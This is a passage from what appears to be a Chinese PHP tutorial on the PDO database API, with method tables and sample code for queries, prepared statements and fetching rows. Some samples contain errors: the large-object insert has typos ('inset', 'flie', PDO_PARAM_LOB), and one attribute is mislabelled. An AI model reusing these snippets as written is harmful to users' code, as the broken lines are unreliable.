<td>PDO::ATTR_PERSISTENT</td>
<td style="text-align:left">确定连接是否为持久连接，默认值为FALSE</td>
</tr>
<tr>
<td>PDO::ATTR_ORACLE_NULLS</td>
<td style="text-align:left">将返回的空字符串转换为SQL的NULL</td>
</tr>
<tr>
<td>PDO::ATTR_PREFETCH</td>
<td style="text-align:left">设置应用程序提前获取的数据大小，以K字节为单位</td>
</tr>
<tr>
<td>PDO::ATTR_TIMEOUT</td>
<td style="text-align:left">设置超时之前等待的时间</td>
</tr>
<tr>
<td>PDO::ATTR_SERVER_INFO</td>
<td style="text-align:left">包含与数据库特有的服务器信息</td>
</tr>
<tr>
<td>PDO::ATTR_SERVER_VERSION</td>
<td style="text-align:left">包含与数据库服务器版本号有关的信息</td>
</tr>
<tr>
<td>PDO::ATTR_CLIENT_VERSION</td>
<td style="text-align:left">包含与数据库客户端版本号有关的信息</td>
</tr>
<tr>
<td>PDO::ATTR_CONNECTION_STATUS</td>
<td style="text-align:left">包含与数据库特有的与连接状态有关的信息</td>
</tr>
</tbody>
</table>
<h3 id="PDO对象中的成员方法"><a href="#PDO对象中的成员方法" class="headerlink" title="PDO对象中的成员方法"></a>PDO对象中的成员方法</h3><table>
<thead>
<tr>
<th>成员方法名</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>getAttribute()</td>
<td style="text-align:left">获取一个“数据库连接对象”的属性</td>
</tr>
<tr>
<td>setAttribute()</td>
<td style="text-align:left">为一个“数据库连接对象”设定属性</td>
</tr>
<tr>
<td>errorCode()</td>
<td style="text-align:left">获取错误码</td>
</tr>
<tr>
<td>errorInfo()</td>
<td style="text-align:left">获取错误的信息</td>
</tr>
<tr>
<td>exec()</td>
<td style="text-align:left">处理一条SQL语句，并返回所影响的条目数</td>
</tr>
<tr>
<td>query()</td>
<td style="text-align:left">处理一条SQL语句，并返回一个“PDOStatement”对象</td>
</tr>
<tr>
<td>lastInsertId()</td>
<td style="text-align:left">获取插入到表中的最后一条数据的主键值</td>
</tr>
<tr>
<td>prepare()</td>
<td style="text-align:left">负责准备要执行的SQL语句</td>
</tr>
<tr>
<td>getAvailableDrivers()</td>
<td style="text-align:left">获取有效的PDO驱动器名称</td>
</tr>
<tr>
<td>beginTransaction()</td>
<td style="text-align:left">开始一个事务，表明回滚起始点</td>
</tr>
<tr>
<td>commit()</td>
<td style="text-align:left">提交一个事务，并执行SQL</td>
</tr>
<tr>
<td>rollback()</td>
<td style="text-align:left">回滚一个事务</td>
</tr>
</tbody>
</table>
<h2 id="使用PDO对象"><a href="#使用PDO对象" class="headerlink" title="使用PDO对象"></a>使用PDO对象</h2><h3 id="调整PDO的行为属性"><a href="#调整PDO的行为属性" class="headerlink" title="调整PDO的行为属性"></a>调整PDO的行为属性</h3><h4 id="getAttribute"><a href="#getAttribute" class="headerlink" title="getAttribute()"></a>getAttribute()</h4><p>该方法只需要提供一个参数，传递一个特定属性名称，执行成功返回该属性所指定的值，否则返回NULL。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	$opt=array(PDO::ATTR_PERSISTENT =&gt; TRUE);</div><div class="line">	try &#123;</div><div class="line">   		$dbh = new PDO(&apos;mysql:dbname=testdb;host=localhost&apos;, &apos;mysql_user&apos;, &apos;mysql_pwd&apos;, $opt);</div><div class="line">	&#125; catch (PDOException $e) &#123;</div><div class="line">		echo &apos;数据库连接失败：&apos;.$e-&gt;getMessage();</div><div class="line">		exit;</div><div class="line">	&#125;</div><div class="line">	echo &quot;\nPDO是否关闭自动提交功能：&quot;.$dbh-&gt;getAttribute(PDO::ATTR_AUTOCOMMIT);</div><div class="line">	echo &quot;\n当前PDO的错误处理的模式：&quot;.$dbh-&gt;getAttribute(PDO::ATTR_ERRMODE);</div><div class="line">	echo &quot;\n表字段字符的大小写转换： &quot;.$dbh-&gt;getAttribute(PDO::ATTR_CASE);</div><div class="line">	echo &quot;\n与连接状态相关特有信息： &quot;.$dbh-&gt;getAttribute(PDO::ATTR_CONNECTION_STATUS);</div><div class="line">	echo &quot;\n空字符串转换为SQL的null：&quot;.$dbh-&gt;getAttribute(PDO::ATTR_ORACLE_NULLS);</div><div class="line">	echo &quot;\n应用程序提前获取数据大小：&quot;.$dbh-&gt;getAttribute(PDO::ATTR_PERSISTENT);</div><div class="line">	echo &quot;\n与数据库特有的服务器信息：&quot;.$dbh-&gt;getAttribute(PDO::ATTR_SERVER_INFO);</div><div class="line">	echo &quot;\n数据库服务器版本号信息：&quot;.$dbh-&gt;getAttribute(PDO::ATTR_SERVER_VERSION);</div><div class="line">	echo &quot;\n数据库客户端版本号信息：&quot;.$dbh-&gt;getAttribute(PDO::ATTR_CLIENT_VERSION);</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<h4 id="setAttribute"><a href="#setAttribute" class="headerlink" title="setAttribute()"></a>setAttribute()</h4><p>这个方法需要两个参数，第一个参数提供PDO对象特定的属性名，第二个参数则是为这个指定的属性赋一个值。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$dbh-&gt;setAttribute(PDO::ATTR_ERRMODE,PDO::ERRMODE_EXCEPTION);		//设置抛出异常处理错误</div></pre></td></tr></table></figure></p>
<h3 id="使用PDO执行SQL语句"><a href="#使用PDO执行SQL语句" class="headerlink" title="使用PDO执行SQL语句"></a>使用PDO执行SQL语句</h3><h4 id="使用PDO-exec-方法"><a href="#使用PDO-exec-方法" class="headerlink" title="使用PDO::exec()方法"></a>使用PDO::exec()方法</h4><p>当执行INSERT、UPDATE和DELETE等没有结果集的查询时，使用PDO对象中的exec()方法去执行。该方法成功执行后，将返回受影响的行数。该方法不能用于SELECT查询。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	try&#123;</div><div class="line">		$dbh=new PDO(&apos;mysql:dbname=testdb;host=localhost&apos;,&apos;mysql_user&apos;,&apos;mysql_pwd&apos;);</div><div class="line">	&#125;catch(PDOException $e)&#123;</div><div class="line">		echo &apos;数据库连接失败：&apos;.$e-&gt;getMessage();</div><div class="line">		exit;	</div><div class="line">	&#125;</div><div class="line">	$query=&quot;UPDATE contactInfo SET phone=&apos;15801680168&apos; where name=&apos;高某某&apos;&quot;;</div><div class="line">	$affected=$dbh-&gt;exec($query);</div><div class="line">	if($affected)&#123;</div><div class="line">		echo &apos;数据表contactInfo中受影响的行数为：&apos;.$affected;</div><div class="line">	&#125;else&#123;</div><div class="line">		print_r($dbh-&gt;errorInfo());</div><div class="line">	&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<h4 id="使用PDO-query-方法"><a href="#使用PDO-query-方法" class="headerlink" title="使用PDO::query()方法"></a>使用PDO::query()方法</h4><p>当执行返回结果集的SELECT查询时，或者所影响的行数无关紧要时，应当使用PDO对象中的query()方法。如果该方法成功执行指定的查询，返回一个PDOStatement对象。如果使用了query()方法，并想了解影响的行总数，可以使用PDO对象中的rowCount()方法获取。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	try&#123;</div><div class="line">	　　$dbh=new PDO(&apos;mysql:dbname=testdb;host=localhost&apos;,&apos;mysql_user&apos;,&apos;mysql_pwd&apos;);　　</div><div class="line">	　　$dbh-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);</div><div class="line">	&#125;catch(PDOException $e)&#123;</div><div class="line">		echo &apos;数据库连接失败：&apos;.$e-&gt;getMessage();</div><div class="line">		exit;</div><div class="line">	&#125;</div><div class="line">	$query=&quot;SELECT name, phone, email FROM contactInfo WHERE departmentId=&apos;D01&apos;&quot;;	</div><div class="line">	try &#123;</div><div class="line">		$pdostatement=$dbh-&gt;query($query);</div><div class="line">　　　　　	echo &quot;一共从表中获取到&quot;.$pdostatement-&gt;rowCount().&quot;条记录:\n&quot;;</div><div class="line">		foreach ($pdostatement as $row) &#123;</div><div class="line">       		echo $row[&apos;name&apos;] . &quot;\t&quot;;</div><div class="line">       		echo $row[&apos;phone&apos;] . &quot;\t&quot;;</div><div class="line">        		echo $row[&apos;email&apos;] . &quot;\n&quot;;</div><div class="line">    		&#125;</div><div class="line">	&#125; catch (PDOException $e) &#123;</div><div class="line">		echo $e-&gt;getMessage();</div><div class="line"> 		print_r($dbh-&gt;errorInfo());</div><div class="line">	&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<h2 id="PDO对预处理语句的支持"><a href="#PDO对预处理语句的支持" class="headerlink" title="PDO对预处理语句的支持"></a>PDO对预处理语句的支持</h2><h3 id="了解PDOStatement对象"><a href="#了解PDOStatement对象" class="headerlink" title="了解PDOStatement对象"></a>了解PDOStatement对象</h3><table>
<thead>
<tr>
<th>方法名</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>bindColumn()</td>
<td style="text-align:left">用来匹配列名和一个指定的变量名，这样每次获取各行记录时，会自动将相应的列值赋给该变量</td>
</tr>
<tr>
<td>bindParam()</td>
<td style="text-align:left">将参数绑定到相应的查询占位符上</td>
</tr>
<tr>
<td>bindValue()</td>
<td style="text-align:left">将一值绑定到对应的一个参数中</td>
</tr>
<tr>
<td>closeCursor()</td>
<td style="text-align:left">关闭游标，使该声明再次被执行</td>
</tr>
<tr>
<td>columnCount()</td>
<td style="text-align:left">在结果集中返回列的数目</td>
</tr>
<tr>
<td>errorCode()</td>
<td style="text-align:left">获取错误码</td>
</tr>
<tr>
<td>errorInfo()</td>
<td style="text-align:left">获取错误的信息</td>
</tr>
<tr>
<td>execute()</td>
<td style="text-align:left">负责执行一个准备好的预处理查询</td>
</tr>
<tr>
<td>fetch()</td>
<td style="text-align:left">返回结果集的下一行，当到达结果集末尾时返回FALSE</td>
</tr>
<tr>
<td>fetchAll()</td>
<td style="text-align:left">通过一次调用就可以获取结果集中的所有行，并赋给返回的数组</td>
</tr>
<tr>
<td>fetchColumn()</td>
<td style="text-align:left">返回结果集中下一行某个列的值</td>
</tr>
<tr>
<td>fetchObject()</td>
<td style="text-align:left">获取下一行记录并返回它作为一个对象</td>
</tr>
<tr>
<td>getAttribute()</td>
<td style="text-align:left">获取一个声明属性</td>
</tr>
<tr>
<td>getColumnMeta()</td>
<td style="text-align:left">在结果集中返回某一列的属性信息</td>
</tr>
<tr>
<td>nextRowset()</td>
<td style="text-align:left">检索下一行集（结果集）</td>
</tr>
<tr>
<td>rowCount()</td>
<td style="text-align:left">返回使用query（）方法执行的SELECT语句后受影响的行总数</td>
</tr>
<tr>
<td>setAttribute()</td>
<td style="text-align:left">为一个预处理语句设置属性</td>
</tr>
<tr>
<td>setFetchMode()</td>
<td style="text-align:left">设置需要结果集合的类型</td>
</tr>
</tbody>
</table>
<h3 id="准备语句"><a href="#准备语句" class="headerlink" title="准备语句"></a>准备语句</h3><p>PDO中有两种使用占位符的语法：“命名参数”和“问号参数”。</p>
<ul>
<li><p>使用命名参数作为占位符的INSERT查询</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$dbh-&gt;prepare(&quot;INSERT INTO contactInfo(name,address,phone) VALUES(:name,:address,:phone)&quot;);</div></pre></td></tr></table></figure>
</li>
<li><p>使用问号（？）参数作为占位符的INSERT查询</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$dbh-&gt;prepare(&quot;INSERT INTO contactInfo(name,address,phone) VALUES(?,?,?)&quot;);</div></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="绑定参数"><a href="#绑定参数" class="headerlink" title="绑定参数"></a>绑定参数</h3><p>当查询准备好之后，需要在每次执行时替换输入的参数。可以通过PDOStatement对象中的bindParam()方法，把参数绑定到准备好的查询中相应的占位符。方法bindParame()的原型如下所示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bindParam(mixed parameter,mixed&amp;variable[,int data_type[,int length[,mixed driver_options]]])</div></pre></td></tr></table></figure></p>
<p>第一个参数parameter是必选项，如果在准备好的查询中，占位符语法使用名字参数时，将名字参数字符串作为bindParam()方法的第一个参数提供。如果占位符语法使用问号参数时，将准备好的查询中列值占位符的索引偏移量，作为该方法的第一个参数提供。<br>第二个参数variable也是必选项，提供赋给第一个参数所指定占位符的值。它需要按引用传递，在结合准备存储过程使用此方时，可以根据存储过程的某个动作修改这个值。因为该参数是按引用传递，所以只能提供变量作为参数，不能直接提供数值。<br>第三个参数data_type是可选项，显示地为当前被绑定的参数设置数据类型。</p>
<ul>
<li>PDO::PARAM_BOOL:代表boolean数据类型</li>
<li>PDO::PARAM_NULL:代表SQL中NULL类型</li>
<li>PDO::PARAM_INT:代表SQL中INTEGER数据类型</li>
<li>PDO::PARAM_STR:代表SQL中CHAR、VARCHAR和其他字符串数据类型</li>
<li>PDO::PARAM_LOB:代表SQL中大对象数据类型</li>
<li>PDO::PARAM_STMT:代表PDOStatement对象类型</li>
<li>PDO::PARAM_INPUT_OUTPUT:专为存储过程使用的数据类型，可以在过程执行后修改</li>
</ul>
<p>第四个参数length是可选项，用于指定数据类型的长度，当在第三个参数中使用PDO_PARAM_INPUT_OUTPUT数据类型时必须使用这个参数。<br>第五个参数driver_options是可选项，通过该参数提供任何数据库驱动程序特定的选项。</p>
<h3 id="执行准备好的查询"><a href="#执行准备好的查询" class="headerlink" title="执行准备好的查询"></a>执行准备好的查询</h3><p>当准备好查询并绑定了相应的参数，就可以通过调用PDOStatement类对象中的execute（）方法反复执行了。<br>execute()方法中提供了一个可选参数，该参数由准备查询中的命名参数占位符组成的数组，这是第二种为预处理查询在执行中替换输入参数的方式。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">&lt;?php </div><div class="line">	try&#123;</div><div class="line">		$dbh=new PDO(&apos;mysql:dbname=testdb;host=localhost&apos;,&apos;mysql_user&apos;,&apos;mysql_pwd&apos;);</div><div class="line">	&#125;catch(PDOException $e)&#123;</div><div class="line">		echo &apos;数据库连接失败：&apos;.$e-&gt;getMessage();</div><div class="line">		exit;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	$query=&quot;INSERT INTO contactInfo (name, address, phone) VALUES (:name, :address, :phone)&quot;;</div><div class="line">	$stmt=$dbh-&gt;prepare($query);</div><div class="line"></div><div class="line">	$stmt-&gt;execute(array(&quot;:name&quot;=&gt;&quot;赵某某&quot;,&quot;:address&quot;=&gt;&quot;海淀区&quot;, &quot;:phone&quot;=&gt;&quot;15801688348&quot;));</div><div class="line"></div><div class="line">	$stmt-&gt;execute(array(&quot;:name&quot;=&gt;&quot;孙某某&quot;,&quot;:address&quot;=&gt;&quot;宣武区&quot;, &quot;:phone&quot;=&gt;&quot;15801688698&quot;));</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<h3 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h3><h4 id="fetch-方法"><a href="#fetch-方法" class="headerlink" title="fetch()方法"></a>fetch()方法</h4><p>DOStatement类中的fetch()方法可以将结果集中当前行的记录以某种方法返回，并将结果集指针移至下一行，当到达结果集末尾时返回FALSE。该方法的原型如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">fetch([int fetch_style[,int cursor_orientation[,int cursor_offset]]])	//返回结果集的下一行</div></pre></td></tr></table></figure></p>
<p>第一个参数fetch_style是必选项，获取的一行数据记录中，各列的引用方式取决于这个参数如何设置。可以使用的设置以下六种。</p>
<ul>
<li>PDO::FETCH_ASSOC:从结果集中获取按列名为索引的关联数组</li>
<li>PDO::FETCH_NUM:从结果集中获取一个按列在航中的数值偏移为索引的值数组</li>
<li>PDO::FETCH_BOTH:这是默认值，包含上面两种数组</li>
<li>PDO::FETCH_OBJ：从结果集当前行的记录中获取其属性对应各个列名的一个对象</li>
<li>PDO::FETCH_BOUND:使用fetch()返回TRUE，并将获取的列值赋给通过bindParam()方法中指定的相应变量</li>
<li>PDO::FETCH_LAZY：创建关联数组和索引数组，以及包含列属性的一个对象，从而可以在这三种接口中任选一种</li>
</ul>
<p>第二个参数curosr_orientation是可选项，用来确定当对象是一个可滚动的游标时应当获取哪一行。<br>第三个参数cursor_offset也是可选项，需要提供一个整数值，表示要获取的行相对于当前游标位置的偏移。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">&lt;?php </div><div class="line">	try&#123;</div><div class="line">		$dbh=new PDO(&apos;mysql:dbname=testdb;host=localhost&apos;,&apos;mysql_user&apos;,&apos;mysql_pwd&apos;);</div><div class="line">	&#125;catch(PDOException $e)&#123;</div><div class="line">		echo &apos;数据库连接失败：&apos;.$e-&gt;getMessage();</div><div class="line">		exit;</div><div class="line">	&#125;</div><div class="line">	echo &apos;&lt;table border=&quot;1&quot; align=&quot;center&quot; width=90%&gt;&apos;;</div><div class="line">	echo &apos;&lt;caption&gt;&lt;h1&gt;联系人信息表&lt;/h1&gt;&lt;/caption&gt;&apos;;</div><div class="line">	echo &apos;&lt;tr bgcolor=&quot;#cccccc&quot;&gt;&apos;;</div><div class="line">	echo &apos;&lt;th&gt;UID&lt;/th&gt;&lt;th&gt;姓名&lt;/th&gt;&lt;th&gt;联系地址&lt;/th&gt;&lt;th&gt;联系电话&lt;/th&gt;&lt;th&gt;电子邮件&lt;/th&gt;&lt;/tr&gt;&apos;;</div><div class="line">	$stmt=$dbh-&gt;query(&quot;select uid,name,address,phone,email from contactInfo&quot;);</div><div class="line">	while($row=$stmt-&gt;fetch(PDO::FETCH_ASSOC))&#123;</div><div class="line">		echo &apos;&lt;tr&gt;&apos;;</div><div class="line">		echo &apos;&lt;td&gt;&apos;.$row[&quot;uid&quot;].&apos;&lt;/td&gt;&apos;;</div><div class="line">		echo &apos;&lt;td&gt;&apos;.$row[&quot;name&quot;].&apos;&lt;/td&gt;&apos;;</div><div class="line">		echo &apos;&lt;td&gt;&apos;.$row[&quot;address&quot;].&apos;&lt;/td&gt;&apos;;</div><div class="line">		echo &apos;&lt;td&gt;&apos;.$row[&quot;phone&quot;].&apos;&lt;/td&gt;&apos;;</div><div class="line">		echo &apos;&lt;td&gt;&apos;.$row[&quot;email&quot;].&apos;&lt;/td&gt;&apos;;</div><div class="line">		echo &apos;&lt;/tr&gt;&apos;;</div><div class="line">	&#125;</div><div class="line">	echo &apos;&lt;/table&gt;&apos;;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<h4 id="fetchAll-方法"><a href="#fetchAll-方法" class="headerlink" title="fetchAll()方法"></a>fetchAll()方法</h4><p>fetchAll()方法与上一个方法fetch()类似，但是该方法只需要调用一次就可以获取结果集中的所有行，并赋给返回的数组。该方法的原型如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">fetchAll([int fetch_style[,int column_index]])			//一次调用返回结果集中所有行</div></pre></td></tr></table></figure></p>
<p>第一个参数fetch_style是必选项，以何种方式引用所获取的列取决于该参数。默认值为PDO::FETCH_BOTH，还可以指定PDO::FETCH_COLUMN值，从结果集中返回一个包含单列的所有值。<br>第二个参数column_index是可选项，需要提供一个整数索引，当在fetchAll()方法的第一个参数中指定PDO::FETCH_COLUMN值时，从结果集中返回通过该参数提供的索引所指定列的所有值。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	try&#123;</div><div class="line">		$dbh=new PDO(&apos;mysql:dbname=testdb;host=localhost&apos;,&apos;mysql_user&apos;,&apos;mysql_pwd&apos;);</div><div class="line">	&#125;catch(PDOException $e)&#123;</div><div class="line">		echo &apos;数据库连接失败：&apos;.$e-&gt;getMessage();</div><div class="line">		exit;</div><div class="line">	&#125;</div><div class="line">	echo &apos;&lt;table border=&quot;1&quot; align=&quot;center&quot; width=90%&gt;&apos;;</div><div class="line">	echo &apos;&lt;caption&gt;&lt;h1&gt;联系人信息表&lt;/h1&gt;&lt;/caption&gt;&apos;;</div><div class="line">	echo &apos;&lt;tr bgcolor=&quot;#cccccc&quot;&gt;&apos;;</div><div class="line">	echo &apos;&lt;th&gt;UID&lt;/th&gt;&lt;th&gt;姓名&lt;/th&gt;&lt;th&gt;联系地址&lt;/th&gt;&lt;th&gt;联系电话&lt;/th&gt;&lt;th&gt;电子邮件&lt;/th&gt;&lt;/tr&gt;&apos;;	$stmt=$dbh-&gt;prepare(&quot;select uid,name,address,phone,email from contactInfo&quot;);</div><div class="line">	$stmt-&gt;execute();</div><div class="line">	$allRows=$stmt-&gt;fetchAll(PDO::FETCH_NUM);</div><div class="line">	foreach($allRows as $row)&#123;</div><div class="line">		echo &apos;&lt;tr&gt;&apos;;</div><div class="line">		echo &apos;&lt;td&gt;&apos;.$row[0].&apos;&lt;/td&gt;&apos;;</div><div class="line">		echo &apos;&lt;td&gt;&apos;.$row[1].&apos;&lt;/td&gt;&apos;;</div><div class="line">		echo &apos;&lt;td&gt;&apos;.$row[2].&apos;&lt;/td&gt;&apos;;</div><div class="line">		echo &apos;&lt;td&gt;&apos;.$row[3].&apos;&lt;/td&gt;&apos;;</div><div class="line">		echo &apos;&lt;td&gt;&apos;.$row[4].&apos;&lt;/td&gt;&apos;;</div><div class="line">		echo &apos;&lt;/tr&gt;&apos;;</div><div class="line">	&#125;</div><div class="line">	echo &apos;&lt;/table&gt;&apos;;</div><div class="line"></div><div class="line">	$stmt-&gt;execute();</div><div class="line">	$row=$stmt-&gt;fetchAll(PDO::FETCH_COLUMN, 1);</div><div class="line">	echo &apos;所有联系人的姓名：&apos;;</div><div class="line">	print_r($row);</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<h4 id="bindColumn-方法"><a href="#bindColumn-方法" class="headerlink" title="bindColumn()方法"></a>bindColumn()方法</h4><p>使用该方法可以将一个列和一个指定的变量名绑定，这样在每次使用fetch()方法获取各行记录时，会自动将相应的列值赋给该变量，但必须是在fetch()方法第一个参数设置为PDO：：FETCH_BOTH值时。bindColumn()方法的原型如下所示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bindColumn(mixed coumn,mixed&amp;param[,int type])		//设置绑定列值到变量上</div></pre></td></tr></table></figure></p>
<p>第一个参数column为必选项，可以使用整数的列偏移位置索引（索引值从1开始），或是列的名称字符串。第二个参数param也是必选项，需要传递一个引用，所以必须提供一个相应的变量名。第三个参数type是可选项，通过设置变量的类型来限制变量值。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	try&#123;</div><div class="line">		$dbh=new PDO(&apos;mysql:dbname=testdb;host=localhost&apos;,&apos;mysql_user&apos;,&apos;mysql_pwd&apos;);</div><div class="line">		$dbh-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);</div><div class="line">	&#125;catch(PDOException $e)&#123;</div><div class="line">		echo &apos;数据库连接失败：&apos;.$e-&gt;getMessage();</div><div class="line">		exit;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	$query=&quot;SELECT uid, name, phone, email FROM contactInfo WHERE departmentId=&apos;D01&apos;&quot;;</div><div class="line">	try &#123;</div><div class="line">		$stmt=$dbh-&gt;prepare($query);</div><div class="line">		$stmt-&gt;execute();</div><div class="line">		$stmt-&gt;bindColumn(1, $uid);</div><div class="line">		$stmt-&gt;bindColumn(2, $name);</div><div class="line">		$stmt-&gt;bindColumn(&apos;phone&apos;, $phone);</div><div class="line">		$stmt-&gt;bindColumn(&apos;email&apos;, $email);</div><div class="line"></div><div class="line">		while ($row = $stmt-&gt;fetch(PDO::FETCH_BOUND)) &#123;</div><div class="line">			 echo $uid.&quot;\t&quot;.$name.&quot;\t&quot;.$phone.&quot;\t&quot;.$email.&quot;\n&quot;;</div><div class="line">		&#125;</div><div class="line">	&#125; catch (PDOException $e) &#123;</div><div class="line">		echo $e-&gt;getMessage();</div><div class="line">	&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<h4 id="大数据对象的存取"><a href="#大数据对象的存取" class="headerlink" title="大数据对象的存取"></a>大数据对象的存取</h4><p>PDO允许在bindParam()或bindColumn()调用中通过使用PDO::PARAM_LOB类型代码来使用大型数据库类型。PDO::PARAM_LOB告诉PDO将数据映射为流，所以可以使用PHP中文件处理函数来操纵这样的数据。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	$dbh=new PDO(&apos;mysql:dbname=testdb;host=localhost&apos;,&apos;mysql_user&apos;,&apos;mysql_pwd&apos;);		//连接数据库</div><div class="line">	$stmt=$dbh-&gt;prepare(&quot;inset into images(contenttype,imagedata)values(?,?)&quot;);			//准备插入查询</div><div class="line">	$fp=fopen($_FILES[&apos;file&apos;][&apos;tmp_name&apos;],&apos;rb&apos;);			//使用fopen()函数打开上传的文件</div><div class="line">	$stmt-&gt;bindParam(1,$_FILES[&apos;flie&apos;][&apos;type&apos;]);			//将上传的MIME类型绑定到第一个参数中</div><div class="line">	$stmt-&gt;bindParam(2,$fp,PDO_PARAM_LOB);			//将上传文件的二进制数据和第二个参数绑定</div><div class="line">	$stmt-&gt;execute();			//执行准备好的并绑定了参数的查询</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<h1 id="会话控制"><a href="#会话控制" class="headerlink" title="会话控制"></a>会话控制</h1><h2 id="Cookie的应用"><a href="#Cookie的应用" class="headerlink" title="Cookie的应用"></a>Cookie的应用</h2><h3 id="Cookie概述"><a href="#Cookie概述" class="headerlink" title="Cookie概述"></a>Cookie概述</h3><p>Cookie是用来将使用者资料记录在客户端的技术，这种技术让Web服务器能将一些只需存放于客户端，或者可以在客户端进行运算的资料，存放于用户的电脑系统之中。</p>
<h3 id="向客户端电脑中设置Cookie"><a href="#向客户端电脑中设置Cookie" class="headerlink" title="向客户端电脑中设置Cookie"></a>向客户端电脑中设置Cookie</h3><p>使用PHP内建的setCookie()函数来新建立一个Cookie。Cookie是HTTP标头的一部分，因此setCookie()函数必须在其他信息被输出到浏览器前调用，所以即使是空格或空行都不要在调用setCookie()函数之前输出。setCookie()函数的语法格式如下所示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bool setcookie(string $name[,string $value[,int $expire[,string $path[,string $domain[,bool $secure]]]]])</div></pre></td></tr></table></figure></p>
<p>setcookie()函数定义一个和其余的HTTP标头一起发送的Cookie，它的所有参数是对应HTTP标头Cookie资料的属性。</p>
<table>
<thead>
<tr>
<th>参数</th>
<th style="text-align:left">描述</th>
<th style="text-align:left">示例</th>
</tr>
</thead>
<tbody>
